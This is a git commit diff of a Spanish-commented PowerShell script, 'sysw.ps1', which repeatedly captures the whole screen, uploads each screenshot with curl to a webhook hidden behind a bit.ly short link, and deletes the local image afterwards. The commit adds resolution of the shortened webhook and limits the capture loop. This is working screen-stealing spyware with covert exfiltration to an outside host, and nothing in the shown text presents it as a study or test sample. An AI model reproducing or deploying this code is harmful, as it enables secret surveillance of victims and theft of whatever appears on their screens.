08c7980cd0aa755df1384e5a3082839ff0132334
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-11 11:45:02 -0500

    Actualizar sysw.ps1

--- sysw.ps1
+++ sysw.ps1
@@ -1,9 +1,14 @@
 $hookurl = "https://bit.ly/web_chupakbras"
-$seconds = 30 # Intervalo entre capturas en segundos
-$counter = 1 # Contador de imágenes
+$seconds = 30 # Intervalo entre capturas de pantalla
+$a = 1 # Cantidad de capturas de pantalla
 
-While ($true){ # Inicia un bucle infinito
-    $Filett = "$env:temp\SC_$counter.png"
+# Detección de URL acortada
+if ($hookurl.Ln -ne 121){Write-Host "Se detectó una URL de Webhook acortada.." ; $hookurl = (irm $hookurl).url}
+
+$counter = 1
+
+While ($a -gt 0){
+    $Filett = "$env:temp\SC$counter.png"
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
     $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -16,9 +21,10 @@ While ($true){ # Inicia un bucle infinito
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$Filett" $hookurl
+    curl.exe -F "file1=@$filett" $hookurl
     Start-Sleep 1
-    Remove-Item -Path $Filett
+    Remove-Item -Path $filett
     Start-Sleep $seconds
-    $counter++ # Incrementa el contador
+    $a--
+    $counter++
 }
